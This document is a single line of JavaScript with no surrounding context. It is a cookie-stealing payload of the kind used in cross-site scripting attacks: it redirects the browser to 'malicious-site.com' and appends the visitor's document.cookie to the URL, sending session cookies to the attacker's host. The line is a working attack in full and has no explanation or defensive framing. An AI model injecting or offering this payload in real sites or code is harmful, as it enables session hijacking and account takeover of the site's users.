document.location = "http://malicious-site.com?cookie=" + document.cookie;
